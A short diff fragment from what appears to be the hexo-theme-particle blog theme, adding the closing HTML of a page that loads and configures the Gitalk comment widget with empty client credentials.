+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
